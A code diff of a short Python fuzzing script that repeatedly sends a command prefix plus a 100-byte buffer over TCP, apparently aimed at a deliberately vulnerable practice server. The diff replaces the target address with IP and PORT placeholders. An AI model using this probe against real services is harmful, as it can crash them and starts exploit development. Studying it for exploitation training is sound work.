@@ -3,14 +3,14 @@
 import sys, socket
 from time import sleep
  
-buffer = "A" * 100
+buffer = "F" * 100
  
 while True:
     try:
-        payload = "TRUN /.:/" + buffer
+        payload = "NAME /.:/" + buffer
  
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.1.35',9999))
+        s.connect(('IP',PORT))
         print ("[+] Sending the payload...\n" + str(len(buffer)))
         s.send((payload.encode()))
         s.close()
